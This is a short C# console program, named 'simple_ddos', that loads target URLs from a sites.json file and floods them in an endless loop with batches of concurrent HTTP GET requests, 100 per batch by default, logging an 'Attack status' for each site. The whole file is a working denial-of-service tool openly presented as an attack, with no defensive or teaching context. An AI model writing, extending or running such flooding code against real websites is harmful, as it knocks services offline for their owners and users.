using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace simple_ddos
{
    class Program
    {
        private const int defaultThreads = 100;
        private const int timeout = 1000;

        private static CancellationTokenSource cts = new CancellationTokenSource();


        static void Main(string[] args)
        {
            MainAsync(args).GetAwaiter().GetResult();
        }

        static async Task MainAsync(string[] args)
        {
            int threads = defaultThreads;

            if (args.Length > 0)
            {
                int.TryParse(args[0], out threads);
            }

            Console.WriteLine($"threads per loop: {threads}");

            Console.WriteLine($"request timeout: {timeout}");

            

            var request = new Request();

            var sitesData = File.ReadAllText("sites.json");

            var sites = JsonSerializer.Deserialize<Site[]>(sitesData);

            var rnd = new Random();

            while(true)
            {
                var links = Enumerable.Range(0, threads).Select(i => sites[rnd.Next(0, sites.Length)].url);

                var tasks = links.Select(l => request.Get(l, timeout, cts.Token)).ToList();

                await Task.WhenAll(tasks);
            }

        }
    }


    class Request
    {
        private readonly HttpClient _httpClient = new HttpClient();
        public async Task Get(string url, int timeout, CancellationToken cancellationToken)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            cts.CancelAfter(timeout);
            try
            {
                var response = await _httpClient
                    .GetAsync(url, cancellationToken);
                Console.WriteLine($"Site: {url}; Attack status: {response.StatusCode}");
            }
            catch (OperationCanceledException)
            {

                Console.WriteLine($"Site: {url}; task canceled by timeout");
            }
            catch (Exception)
            {

                Console.WriteLine($"Site: {url}; Attack status: connection refused!");
            }
            finally
            {
                cts.Dispose();
            }
            
        }
    }

    class Site
    {
        public string url { get; set; }
    }
}
